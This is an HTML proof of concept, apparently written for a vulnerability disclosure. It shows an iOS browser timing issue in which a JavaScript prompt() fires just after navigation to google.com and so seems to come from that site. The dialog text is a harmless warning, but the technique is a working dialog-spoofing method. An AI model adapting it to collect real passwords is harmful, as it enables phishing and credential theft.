<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>iOS Dialog Timing PoC</title>
</head>
<body>
  <h3>iOS Browser Dialog Timing PoC</h3>

  <script>
    setTimeout(() => {
      // trigger top-level navigation
      location.href = "https://www.google.com";

      // dialog shortly after navigation starts
      setTimeout(() => {
        prompt(
          "fake.google.com\n⚠️ Do not sign into your account",
          ""
        );
      }, 50);
    }, 3000);
  </script>
</body>
</html>
